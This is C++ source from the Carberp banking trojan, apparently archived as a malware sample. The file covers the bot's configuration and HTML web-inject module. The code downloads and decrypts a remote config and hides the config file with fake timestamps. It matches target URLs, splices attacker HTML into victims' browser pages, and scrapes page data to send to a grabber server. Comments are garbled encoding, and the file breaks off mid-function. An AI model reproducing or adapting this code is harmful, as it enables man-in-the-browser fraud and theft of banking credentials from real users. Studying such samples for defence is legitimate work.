/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <shlobj.h>

#include "BotConfig.h"
#include "BotCore.h"
#include "Loader.h"
#include "BotDef.h"
#include "StrConsts.h"
#include "BotUtils.h"

#include "Modules.h"

#include "BotMonitorMsg.h"

// ---------------------------------------------------------------------------

#include "BotDebug.h"

namespace CONFIGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define CFGDBG CONFIGDEBUGSTRINGS::DBGOutMessage<>

// ---------------------------------------------------------------------------

bool bHttp;
bool bHttps;

//**********************************************************
//  ���������� ����������, ��������� ���� �� ���������-
//  �������� �����
//**********************************************************
TBotConfig* BotConfig;

DWORD BotConfigPID = 0; // PID �������� � ������� ���������� ������



LPVOID InjectEventData; // ������ ��� ������ �������
THTMLInjectEvent InjectEvent; // ���������� ������� HTML �������

void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event) {
	// ������� ������������� ���������� ������� ��� ������� HTML
	InjectEventData = Data;
	InjectEvent = Event;
}

void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
{
	// �������� ������� �������
	if (InjectEvent != NULL) {
		InjectEvent(InjectEventData, Sender, ID, Reserved); 
	}
}


void GetCurrentConfigHostSetings(bool * http, bool * https)
{
	*http = bHttp;
	*https = bHttps;
}

PCHAR FgrHostFromCfg = NULL; // 1
PCHAR GraHostFromCfg = NULL; // 2
PCHAR ScrHostFromCfg = NULL; // 3
PCHAR SniHostFromCfg = NULL; // 4
PCHAR PluginsHostFromCfg = NULL; // 5
DWORD TimeOut = 70;


// ----------------------------------------------------------------------------


void HTMLInjectSetVariableValue(THTMLInjectData *Data, const char* Variable, const char* Value)
{
	// ������� �������� �������� ����������
	Data->Before.Replace(Variable, Value);
	Data->Inject.Replace(Variable, Value);
	Data->After.Replace(Variable, Value);
}

void inline HTMLInjectSetVariableValue(THTMLInjectData *Data, const string &Variable, const string &Value)
{
	HTMLInjectSetVariableValue(Data, Variable.t_str(), Value.t_str());
}


void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
{
	// ������� ������ ������������� ���� �� ��� ��������

	if (Data == NULL) return;

    const static char VariableBotID[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0};
    const static char VariableDebug[] = {'%','d','e','b','u','g','%', 0};



	PCHAR BotID = GenerateBotID();
	#ifdef DEBUGCONFIG
	PCHAR IsDebug = "true";
	#else
	PCHAR IsDebug = "false";
	#endif


	HTMLInjectSetVariableValue(Data, VariableBotID, BotID);
	HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);

	#ifdef AzConfigH
		HTMLInjectSetVariableValue(Data, GetStr(AzConfigParamUserName), GetAzUser());
	#endif

	STR::Free(BotID);
}


// ������������� �������� �� ������ ����������
void SetValuesFromVariables(TValues* Values, THTMLInjectData *Data)
{
	int Count = Values->Count();
	for (int i = 0; i < Count; i++)
	{
		TValue* V = Values->Items(i);
		HTMLInjectSetVariableValue(Data, V->Name.t_str(), V->Value.t_str());
	}
}

// ----------------------------------------------------------------------------


//PCHAR ReadStrBlock_(PCHAR &Buf)
//{
//	// ������� ������ ������ �� ������ � ������� ��������� �� ������
//	// ������ ������ (DWORD - ����� ������)(������)
//	DWORD Size = *(DWORD*)Buf;
//	Buf += sizeof(DWORD);
//	if (Size == 0)
//		return NULL;
//	PCHAR Str = STR::New(Buf, Size);
//	Buf += Size;
//	return Str;
//}


//void ReadStrBlock_(PCHAR &Buf, string &Out)
//{
//	// ������� ������ ������ �� ������ � ������� ��������� �� ������
//	// ������ ������ (DWORD - ����� ������)(������)
//	DWORD Size = *(DWORD*)Buf;
//	Buf += sizeof(DWORD);
//	if (Size == 0) return;
//
//	Out.Copy(Buf, 0, Size);
//
//	Buf += Size;
//}




//bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
//{
//
//	// ��������� ���������������� ����
//
//	Config->HTMLInjects->Clear();
//
//	CFGDBG("BotConfig", "��������� ����");
//
//	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
//
//	if (File == INVALID_HANDLE_VALUE)
//	{
//		CFGDBG("BotConfig", "������ �������� �����!");
//		return false;
//	}
//
//	DWORD ID = 0;
//	DWORD h = 0;
//	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
//	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
//	if (FileBuf == NULL)
//	{
//		pCloseHandle(File);
//		return false;
//	}
//
//	m_memset(FileBuf, 0, FileSize + 1);
//
//	DWORD Readed = 0;
//	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
//	{
//		MemFree(FileBuf);
//		pCloseHandle(File);
//		return false;
//	}
//
//
//	// ��������� �������� �� ���� ��������
//
//	if (!Config::IsConfig((PCHAR)FileBuf))
//	{
//		PCHAR Password = GetMainPassword();
//		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
//		STR::Free(Password);
//
//		if (!Config::IsConfig((PCHAR)FileBuf))
//		{
//			MemFree(FileBuf);
//			pCloseHandle(File);
//			return false;
//        }
//	}
//
//	// ������ ������
//	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
//		((PCHAR)ConfigSignature, FileBuf, Readed);
//	if (Buf == NULL)
//	{
//		pCloseHandle(File);
//		return false;
//	}
//
//	// ���������� ���� ���������� �������� �������� ���� ����
//	Buf++;
//
//	// ���������� ���������� �����
//	DWORD Count = *(DWORD*)Buf;
//	Buf += sizeof(DWORD);
//
//	// ��������� ���������� � ������
//
//	FgrHostFromCfg = ReadStrBlock_(Buf);
//	GraHostFromCfg = ReadStrBlock_(Buf);
//	ScrHostFromCfg = ReadStrBlock_(Buf);
//	SniHostFromCfg = ReadStrBlock_(Buf);
//	PluginsHostFromCfg = ReadStrBlock_(Buf);
//
//	// ������ ���������� �������
//	TimeOut = *(DWORD*)Buf;
//	Buf += sizeof(DWORD);
//
//	// ------------- ��������� ���������� -------------//
//	bHttp = *Buf != 0;
//	Buf++;
//
//	bHttps = *Buf != 0;
//	Buf++;
//
//	// ------------- ��������� ������ �������� -------------//
//	THTMLInject *Inject;
//	THTMLInjectData *Data;
//	DWORD DataCount;
//	DWORD Mode;
//
//	for (DWORD i = 0; i < Count; i++)
//	{
//		Inject = Config->HTMLInjects->AddInject();
//		if (Inject == NULL)
//			break;
//
//		ID++;
//		Inject->ID = ID;
//		// ������ ����� �������
//		Inject->URL = ReadStrBlock_(Buf);
//
//		// ������ ������ ���������
//		Mode = *(DWORD*)Buf;
//		Buf += sizeof(DWORD);
//
//		// ���������� ������ ������ �����
//		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
//		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
//		Inject->IsLog = (Mode <= 3);
//
//		DataCount = *(DWORD*)Buf;
//		Buf += sizeof(DWORD);
//
//		for (DWORD j = 0; j < DataCount; j++)
//		{
//			Data = Inject->AddData();
//			if (Data == NULL)
//				break;
//
//			ID++;
//			Data->ID = ID;
//			ReadStrBlock_(Buf, Data->Before);
//			ReadStrBlock_(Buf, Data->Inject);
//			ReadStrBlock_(Buf, Data->After);
//
////			Data->Before = ReadStrBlock_(Buf);
////			Data->Inject = ReadStrBlock_(Buf);
////			Data->After = ReadStrBlock_(Buf);
//
//			if (!Data->Before.IsEmpty())
//				Data->MacrosHash = Data->Before.Hash();
//				;
//
//			// � ������� ���� ��������� ���������� � ������ �������� �������
//			#ifndef BV_APP
//				HTMLInjectSetSystemVariables(Data);
//			#endif
//
//		}
//	}
//	MemFree(FileBuf);
//
//	// �������� ����� ��������� �����
////	FILETIME Tm;
////	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
//
//	// -------------------------------
//	pCloseHandle(File);
//
//	CFGDBG("BotConfig", "���� ��������");
//
//	// ��������� ��� ���������� ������������ �����
////	Config->LastConfigFile = WSTR::New(FileName);
//
//	return true;
//}

// ----------------------------------------------------------------------------

//bool Config::LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName)
//{
//	// ��������� ���� �������
//	if (BotConfig == NULL || WSTR::IsEmpty(FileName))
//		return false;
//	pEnterCriticalSection(&Config->Lock);
//
//
//	bool Result = DoLoadConfigFromFileEx(Config, FileName);
//
//	pLeaveCriticalSection(&Config->Lock);
//
//	#ifdef BOTMONITOR
//		if (Result)
//		{
//        	PCHAR FN = WSTR::ToAnsi(FileName, 0);
//			MONITOR_MSG(BMCONST(ConfigLoadFile), FN);
//			STR::Free(FN);
//		}
//	#endif
//
//	return Result;
//
//}


// ----------------------------------------------------------------------------
//void CheckConfigUpdates(PBotConfig Config)
//{
//	// ������� ��������� �� ������������� ������������ �������
//	// ��� ������� � ������ ����, ��� ������� ����� �������
//	// � ����������� ������
//#ifndef BV_APP
//	if (Config->LastConfigFile == NULL)
//		return;
//
//	HANDLE File = (HANDLE)pCreateFileW(Config->LastConfigFile, GENERIC_WRITE, FILE_SHARE_READ,
//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
//
//	if (File == INVALID_HANDLE_VALUE)
//		return;
//
//
//	FILETIME Tm, WT;
//	GetFileTime(File, &Tm, &Tm, &WT);
//	bool NeedUpdate = Config->ConfigTime.dwLowDateTime != WT.dwLowDateTime ||
//                      Config->ConfigTime.dwHighDateTime != WT.dwHighDateTime;
//
//	pCloseHandle(File);
//
//	if (NeedUpdate)
//	{
//    	PWCHAR FN = WSTR::New(Config->LastConfigFile);
//		CFGDBG("BotConfig", "���� ������� ���������. ���������.");
//		DoLoadConfigFromFileEx(Config, FN);
//		WSTR::Free(FN);
//	}
//#endif
//}


// ----------------------------------------------------------------------------

//void FreeHTMLInjectData(LPVOID Data)
//{
//	// ���������� ������ HTML �������
//	delete (THTMLInjectData*)Data;
//}


//void HTMLInjects::FreeInject(THTMLInject *Inject)
//{
//	// ��������
//}



// ----------------------------------------------------------------------------
void HTMLInjects::ReleaseInjectsList(PList List)
{
	// ������� ����������� ������ ��������
	// ������� ���� �������� ��� �������
	if (List == NULL) return;

	TBotConfig* Config = Config::GetConfig();
	if (Config)
		Config->HTMLInjects->ReleaseInjects(List);
}

// ----------------------------------------------------------------------------

//PBotConfig Config::Create()
//{
//	PBotConfig C = CreateStruct(TBotConfig_);
//	if (C == NULL)
//		return NULL;
//	C->HTMLInjects = new THTMLInjectList();
//	pInitializeCriticalSection(&C->Lock);
//	return C;
//}

// ----------------------------------------------------------------------------

//void Config::Free(PBotConfig Cfg)
//{
//	// ������� ���������� ��������� �������
//	if (Cfg == NULL)
//		return;
//	Clear(Cfg);
//	List::Free(Cfg);
////	pDeleteCriticalSection(&Cfg->Lock);
//	FreeStruct(Cfg);
//}


// ----------------------------------------------------------------------------

/*bool ConfigDoGetInjectsForRequest(TBotConfig* BotConfig, PRequest Request) {
	// �������� ������� ��� �������

	// �������� ������
	PCHAR URL = Request->URL;
	bool DelURL = false;
	if (Request->Optional != NULL) {
		// ��������� � ������ ������������ ������
		PCHAR C = NULL;
		if (STR::Scan(Request->Optional, '?') == NULL)
			C = "?";
		URL = STR::New(3, Request->URL, C, Request->Optional);
		DelURL = true;
	}

	// ��������� �������
	DWORD Count = BotConfig->HTMLInjects->Count();
	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);


		if (Inject->Disabled)
			continue;

		// ���������� ������ � ������
		if ((Request->Method == hmGET && Inject->GET) ||
			(Request->Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL.t_str(), URL))
			{
				Inject->Used = true;

				#ifdef BV_APP
					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
				#endif

				#ifdef BOTMONITOR
					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
				#endif

				if (Request->Injects == NULL)
					Request->Injects = List::Create();

				List::Add(Request->Injects, Inject);

				Inject->AddRef(); // ����������� ������� ������������� �������
				Request->IsInject = true;
			}
	}
	//
	if (DelURL)
		STR::Free(URL);

	return Request->IsInject;
}
*/
//----------------------------------------------------------------------------

bool Config::GetInjectsForRequest(PRequest Request)
{
	TBotConfig* Config = GetConfig();
	if (Config)
		return Config->HTMLInjects->GetInjectsForRequest(Request);
	else
		return false;
}

// ----------------------------------------------------------------------------

bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
{
	// ������� ��������� ���� �� ��� ���������� ������ ������
	TBotConfig* Config = GetConfig();
	if (Config)
		return Config->HTMLInjects->IsInjectURL(URL);
	else
		return false;
}
//----------------------------------------------------------------------------


//char BOT_CONFIG_NAME[]    = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 'd', 'a', 't', 0};
//char BOT_CONFIG_NAME_HP[] = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',	0 };


//  ������������� ������������� ��� ����� �������
char OtherConfigFileName[MAX_PATH] = "";

//-----------------------------------------------------------------------------

string Config::GetFileName(bool HightPriority)
{
	// ������� ���������� ��� ����� �� ���������

	// ��������� �� ����������� �� ��� � ������
	if (!HightPriority  && !AnsiStr::IsEmpty(OtherConfigFileName))
		return OtherConfigFileName;

	// �������� ��� �����

	string FileName = (!HightPriority) ? GetStr(EStrConfigFileName) :
										 GetStr(EStrConfigHPFileName);
	string Result = BOT::GetBotPath();
	Result += FileName;
	return Result;
}

// ----------------------------------------------------------------------------
void Config::SetFileName(const char *FileName)
{
	// ������� ������������� ��� ����� �� ���������
	OtherConfigFileName[0] = 0;

	DWORD Len = AnsiStr::Length(FileName);
	if (Len && Len < MAX_PATH)
		m_memcpy(OtherConfigFileName, FileName, Len + 1);
}

// ----------------------------------------------------------------------------

bool Config::IsConfig(PCHAR Buf) {
	// ������� ���������� ������ ���� ����� �������� ��������
	return StrSame(Buf, (PCHAR)ConfigSignature, true, StrCalcLength(ConfigSignature));
}
// ----------------------------------------------------------------------------

bool Config::Download(PCHAR URL)
{
	if (STR::IsEmpty(URL))
		return false;

	PCHAR Buf = NULL;

	// ��������� ����
	if (!HTTP::Get(URL, &Buf, NULL))
		return false;

    DWORD Size = STR::Length(Buf);
	// �������������� ����
	#ifdef CryptHTTPH
	if (!IsConfig(Buf))
	{
		PCHAR Password = GetMainPassword();
		RC2Crypt::DecodeStr(Password, Buf, Size);
		STR::Free(Password);
	}
	#endif

	bool Result = IsConfig(Buf);

	// ���������� ������ � ����
	if (Result)
	{
		string FileName = GetFileName();

		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_ARCHIVE);

		File::WriteBufferA(FileName.t_str(), Buf, Size);

		SetFakeFileDateTime(FileName.t_str());
		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	}

	STR::Free(Buf);

	return Result;
}

// ----------------------------------------------------------------------------

//TBotConfig* Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
//{
//	// ���������������� ��������� ����
//	if (IsNewApplication)
//	{
//		BotConfig = NULL;
//	}
//
//	if (BotConfig == NULL)
//	{
//		BotConfig = Create();
//		if (!DontLoad)
//		{
//			if (FileName == NULL)
//			{
//				FileName = GetFileName(true);
//				if (!FileExistsW(FileName))
//					FileName = GetFileName();
//			}
//
//			LoadConfigFromFile(BotConfig, FileName);
//		}
//	}
//
//	return BotConfig;
//
//}


// ----------------------------------------------------------------------------
TBotConfig* Config::Initialize(PCHAR FileName)
{
	// ������� �������������� ���������� ����� ��������
	if (IsNewProcess(BotConfigPID))
	{
    	BotConfig = NULL;
	}

	if (BotConfig == NULL)
	{
		// ������ ������
		BotConfig = new TBotConfig();

		// ��������� ������ �� �����
        string FN;
		if (FileExistsA(FileName))
			FN = FileName;
		else
		{
			// �������� ��� ����� �� ���������
			FN = GetFileName(true);
			if (!FileExistsA(FN.t_str()))
			   FN = GetFileName(false);
		}

		bool Result = BotConfig->LoadFromFile(FN);
	}

    return BotConfig;
}

// ----------------------------------------------------------------------------

TBotConfig* Config::GetConfig()
{
	// ������� ���������� �� ������ ����
	return BotConfig;
}
// ----------------------------------------------------------------------------

void Config::Clear(TBotConfig* Config)
{
	// �������� ����� �������
	if (Config == NULL)
		Config = BotConfig;
	if (Config)
	{
		Config->Clear();   
    }
}

// ----------------------------------------------------------------------------

bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
	PCHAR Inject, PCHAR After, DWORD &NewBufLen) {
	// ������� ��������� ����� Inject ����� ������� Before � After
	NewBufLen = 0;
	NewBuffer = NULL;
	if (Buffer == NULL)
		return false;

	bool B = !STR::IsEmpty(Before);
	bool A = !STR::IsEmpty(After);
	bool I = !STR::IsEmpty(Inject);

	bool Valid = (B && I && A) || (B && A) || (B && I) || (I && A);

	if (!Valid)
		return false;

	// ������� ����� ������
	DWORD BStart = 0;
	DWORD BEnd = 0;
	DWORD BLen = 0;
	// ������� ����� After
	DWORD AStart = 0;
	DWORD AEnd = 0;
	DWORD ALen = 0;

	//DWORD BufferLen = StrCalcLength(Buffer);

	PCHAR AfterPtr = NULL; 
	// ���� ���� Before
	if (B)
	{
		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
			return false;
	}

	// ���� ���� After
	if (A)
	{
		PCHAR BeforePtr = Buffer + BEnd;
		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
			return false;
		AfterPtr = BeforePtr + AStart;
		// ���� �� ������ ���� Before �� ��������� ����� ����� �� ������
		// ����� After
		if (!B)
			BEnd = AStart;
	}
	else
		AfterPtr = Buffer + BEnd; // ������ ��������� �� ����� ����� Before

	DWORD InjectLen = StrCalcLength(Inject);
	DWORD AfterLen = StrCalcLength(AfterPtr);

	// ������ ����� �����
	NewBufLen = BEnd + InjectLen + AfterLen;
	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
	if (Buf == NULL)
		return false;

	NewBuffer = Buf;

	// �������� ������
	m_memcpy(Buf, Buffer, BEnd);
	Buf += BEnd;
	m_memcpy(Buf, Inject, InjectLen);
	Buf += InjectLen;
	m_memcpy(Buf, AfterPtr, AfterLen);
	Buf += AfterLen;
	*Buf = 0;

	return true;
}
// ----------------------------------------------------------------------------

PCHAR GetHTMLLogCode(PCHAR Buffer, THTMLInject *Inject)
{
	// ������� ���������� HTML ��� �������� �������� �������
	if (STR::IsEmpty(Buffer) || Inject == NULL)
		return NULL;

	PStrings S = Strings::Create();
	bool Added = false;
	PCHAR Code;
	PCHAR Tmp;
	DWORD Count = Inject->Count();
	THTMLInjectData *Data;

	for (DWORD i = 0; i < Count; i++)
	{
		Data = Inject->Items(i);
		Code = GetTextBetween(Buffer, Data->Before.t_str(), Data->After.t_str());
		if (Code != NULL)
		{
			Added = true;
			if (!Data->Inject.IsEmpty())
			{
				Tmp = Code;
				Code = STR::New(3, Data->Inject.t_str(), ": ", Tmp);
				STR::Free(Tmp);
			}
			Strings::Add(S, Code, false);

			Data->State = idsOk;

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&Data->ID, sizeof(Data->ID));
			#endif
			// #ifdef BV_APP
			// CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
			// #endif
		}
	}
	PCHAR Result = NULL;

	if (Added)
		Result = Strings::GetText(S, " ");

	Strings::Free(S);
	return Result;
}

// ----------------------------------------------------------------------------

bool SendHTMLLogToServer(PCHAR Buffer, THTMLInject *Inject, PHTTPSessionInfo Session)
{
	// ������� ���������� ����� HTML �� ��������� � ���������� ������
	if (Inject == NULL || !Inject->IsLog)
		return false;

	// �������� ����������� ������
	PCHAR SendBuffer = NULL;

	PCHAR Data = GetHTMLLogCode(Buffer, Inject);

	if (Data == NULL)
		return false;

	DWORD BrowserType = 0;
	PCHAR UserAgent = NULL;
	PCHAR URL = NULL;

	if (Session != NULL) {
		BrowserType = Session->BrowserType;
		UserAgent = Session->UserAgent;

		// ��������� ������ ����������� � ����������� ������
		if (Session->URL) {
			URL = Session->URL;
			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
			STR::Free(Data);
		}

	}

	if (SendBuffer == NULL)
		SendBuffer = Data;

	DataGrabber::AddData(URL, SendBuffer, UserAgent, BrowserType,
		DATA_TYPE_INJECT, false);

	STR::Free(SendBuffer);

	return true;
}

// ----------------------------------------------------------------------------

bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
{
	// ����� ������������ ����������� HTML ��������
	if (Request == NULL || Inject == NULL)
		return false;

	PCHAR NewBuffer = NULL;
	DWORD NewLen = 0;

	DWORD Count = Inject->Count();
	bool Injected; // ������� ����, ��� ��� ��������� ����-�� ���� ������



	PCHAR BotID = GenerateBotID();

    THTMLInjectData Data(NULL);

	bool Result = false;

	for (DWORD i = 0; i < Count; i++)
	{
	   	THTMLInjectData *SourceData = Inject->Items(i);

		// ����������� ������ ����������
		if (SourceData->Disabled) continue;

		// ����� �������� �������� ������, �.�. ���������
		// ������� ����� ��������� ������� �������
		Data.Copy(*SourceData);

		#ifdef BV_APP
			// �������� ���������� ����������
			HTMLInjectSetSystemVariables(&Data);
		#endif


        SetValuesFromVariables(Config::GetConfig()->HTMLInjects->Variables, &Data);

		Injected  = false;
		NewBuffer = NULL;
		NewLen    = 0;

	   	if (Data.MacrosHash == 0)
		{
			Data.MacrosHash = Data.Before.Hash();
			SourceData->MacrosHash = Data.MacrosHash;
        }

		if (Data.MacrosHash == HIM_REPLACE_DOCUMENT)
		{
			// �������� �� ���������� ���������
			Injected = true;
			NewBuffer = Data.Inject.t_str();
            NewLen    = Data.Inject.Length();
		}
		else
		// �������� HTML ��� � ��������
		{
			// ����� �������� �������� �� �������� �� ������
			// ������� � ������ �������

//			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
//			if (IsLinuxStr)
//			{
//				Data.Before.ConvertToLinuxFormat();
//				Data.Inject.ConvertToLinuxFormat();
//				Data.After.ConvertToLinuxFormat();
//			}

			PCHAR Before = Data.Before.t_str();
			PCHAR Inject = Data.Inject.t_str();
			PCHAR After  = Data.After.t_str();

			// ��������� ������� ������
			if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Before,
					Inject, After, NewLen))
			{
				Injected = true;
			}
        }


		if (Injected)
		{
        	// ������ ��������, ������������ ������
			Result = true;
			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);

			SourceData->State = idsOk;    

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
			#endif

			#ifdef BV_APP                                               
				CallHTMLInjectEvent(SourceData, injDataHandled, NULL);
			#endif
		}

	}

	STR::Free(BotID);

	return Result;

}

// ----------------------------------------------------------------------------

bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
{
	// ���������� HTML �������.
	//
	// ������� ���������� ������ ���� � ������
	// ������� ���� ������� ���������

	if (Request == NULL || !Request->IsInject)
		return false;

	Request->Injected = true; // ������������� ������� ������������ ��������

	bool Result = false;
	DWORD Count = List::Count(Request->Injects);
	bool Injected = false;

	// �������� �������� �������
	#ifdef HTMLInjectLogH
		THTMLInjectLog Log(Request->URL, Request->Buffer,  Request->BufferSize);
	#endif


	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInject *Inject = (THTMLInject*)List::GetItem(Request->Injects, i);

		Inject->CallEvent(BOT_EVENT_HTMLINJECT_EXECUTE);

		if (Inject->IsLog)
			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
		else
		{
			// �������� ���� ��� � ����������� ������
			if (InjectHTMLCode(Request, Inject))
			{
				Injected = true;
				Result = true;
            }
		}
	}

	#ifdef HTMLInjectLogH
		if (Injected)
			Log.Close(Request->Buffer,  Request->BufferSize);
	#endif

	return Result;
}
// ----------------------------------------------------------------------------

bool CheckContentType(PCHAR CType, PCHAR *Types)
{
	for (int i = 0; Types[i] != NULL; i++)
	{
		if (STR::Pos(CType, Types[i], 0, false) >= 0)
        	return true;
	}
	return false;
}

bool HTMLInjects::SupportContentType(PCHAR CType) 
{
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	if (CType == NULL)
		return false;
	if (StrSame(CType, "text/", false, 5))
		return true;

	PCHAR Temp;
	bool FreeStr = false;
	if (STR::Scan(CType, ';') != NULL) {
		Temp = STR::GetLeftStr(CType, ";");
		FreeStr = true;
	}
	else
		Temp = CType;

	PCHAR Types[] = {
					  "application/x-javascript",
					  "application/javascript",
					  "application/xml",
					  "application/xhtml+xml",
					  "application/octet-stream",
						NULL};


	bool Result = CheckContentType(Temp, Types);
	if (FreeStr)
		STR::Free(Temp);
	return Result;
}
// ----------------------------------------------------------------------------


//*****************************************************************************
//                              THTMLInjectList
//*****************************************************************************

THTMLInjectList::THTMLInjectList()
    : TBotCollection(), TEventContainer()
{
	// �������� ������-���������� �����
	SetThreadSafe();
	Variables = new TValues();
    Variables->SetThreadSafe();

}

THTMLInjectList::~THTMLInjectList()
{
	delete Variables;
}



THTMLInject* THTMLInjectList::AddInject()
{
	// ������� ��������� ����� ������
    return new THTMLInject(this);
}

void THTMLInjectList::ResetInjectsStatus()
{
	// ������� ���������� ������ ��������
	TLock L = GetLocker();

	int C = Count();
	for (int i = 0; i < C; i++)
	{
		THTMLInject *Inject = Items(i);
		int DC = Inject->Count();
		for (int j = 0; j < DC; j++)
		{
            Inject->Items(j)->State = idsUnknown;
		}
	}
}


bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
{
	// ������ ������� �� ����� ������

	// ������ � ����������� ������
	TLock L = GetLocker();

	//------------------------------------
	Clear();;

    return false;
	//------------------------------------
	// ������������� ������� �� ����������� ������
}


void THTMLInjectList::Clear()
{
	// ������� ������ �������� � ������ ����, ��� ������� � ������ ������
	// ����� �������������� � ��������. �� ����� ��������� �� �� ���������
	// � ��������� ������� ������

	TLock L = GetLocker();

    CallEvent(BOT_EVENT_HTMLINJECTS_CLEAR);

	while (Count())
	{
		THTMLInject *Item = Items(0);
		Item->SetOwner(NULL);
		Item->Release();
    }
}


void THTMLInjectList::ReleaseInjects(PList Injects)
{
	// ������� ����������� ������ ��������
	if (!Injects) return;

    // ������ � ����������� ������
	TLock L = GetLocker();
	//----------------------------

	int Cnt = List::Count(Injects);
	for (int i = 0; i < Cnt; i++)
	{
		((THTMLInject*)List::GetItem(Injects, i))->Release();;
	}

	List::Clear(Injects);


    //----------------------------
	// ����� �� ����������� ������ ��������� �������������
}


bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PList List)
{
	// ������� ���������� ��� �������� ������� ������� ��� �������
	// ���� List == NULL �� ������� ������ ����� �� ������ �� �������
	// � ������ ������
	if (STRA::IsEmpty(URL)) return false;

    bool Result = false;

	// ������ � ����������� ������
	TLock L = GetLocker();

	//-----------------------------

	DWORD Cnt = Count();
	for (DWORD i = 0; i < Cnt; i++)
	{
		THTMLInject *Inject = Items(i);

		if (Inject->Disabled) continue;

		// ���������� �����
		if (Method != hmUnknown)
		{
			bool Valid = (Method == hmGET && Inject->GET) ||
						 (Method == hmPOST && Inject->POST);
			if (!Valid) continue;
		}

		// ���������� ������
		if (CompareUrl(Inject->URL.t_str(),  URL))
		{
			Result = true;

			// ����������� �� ������� ������� ��� ������� ������
			if (List == NULL) break;

			// ��������� � ������
			Inject->Activated = true;
			Inject->CallEvent(BOT_EVENT_HTMLINJECT_ACTIVATED);

			List::Add(List, Inject);
			Inject->AddRef();
		}
	}


	return Result;
}


// ������� ���������� ������� ��� �������
bool THTMLInjectList::GetInjectsForRequest(PRequest Request)
{
	if (!Request) return false;

	if (Request->Injects)
		List::Clear(Request->Injects);
	else
		Request->Injects = List::Create();

	// �������� ������� ������
	Request->IsInject = GetInjectsForURL(Request->Method, Request->URL, Request->Injects);
	if (!Request->IsInject)
	{
		List::Free(Request->Injects);
		Request->Injects = NULL;
	}
    return Request->IsInject;
}

// ������� ���������� ������ ���� ��� ���������� ������ ���� �������
bool THTMLInjectList::IsInjectURL(const char* URL, THTTPMethod Method)
{
	return GetInjectsForURL(Method, URL, NULL);
}


//*****************************************************************************
//                              THTMLInject
//*****************************************************************************


THTMLInject::THTMLInject(THTMLInjectList *aOwner)
	: TBotCollectionItem(aOwner), TEventContainer()
{
	FItems    = new TBotCollection();
	FRefCount = 1;
}

THTMLInject::~THTMLInject()
{
	delete FItems;
}


void THTMLInject::AddRef()
{
	// ����������� ������� �������������
	pInterlockedIncrement(&FRefCount);
}


void THTMLInject::Release()
{
	// ��������� ������� �������������
	if ((LONG)pInterlockedDecrement(&FRefCount) <= 0)
		delete this;
}



THTMLInjectData* THTMLInject::AddData()
{
	return new THTMLInjectData(this);
}

// ������� ���������� ������ ���� ����-�� � ����� �������
// ���������� ��� ����������
int THTMLInject::ContainVariable(const char* VarName)
{
	int Count = FItems->Count();
	for (int i = 0; i < Count; i++)
	{
		THTMLInjectData* D = Items(i);
		if (D->Before.Pos(VarName) >= 0 ||
			D->Inject.Pos(VarName) >= 0 ||
			D->After.Pos(VarName) >= 0 ) return true;
	}

	return false;
}

//*****************************************************************************
//                              THTMLInjectData
//*****************************************************************************

THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
	: TBotCollectionItem(NULL), TEventContainer()
{
	FOwner = aOwner;
	if (FOwner)
